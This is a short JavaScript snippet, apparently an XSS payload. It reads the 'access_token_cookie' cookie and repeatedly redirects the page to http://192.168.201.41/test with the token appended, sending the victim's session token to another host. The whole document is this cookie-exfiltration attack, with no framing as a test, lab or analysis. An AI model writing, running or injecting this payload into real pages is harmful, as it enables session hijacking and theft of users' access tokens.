function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}
setInterval(function() {  
  document.location = "http://192.168.201.41/test" + getCookie("access_token_cookie")
}, 1);

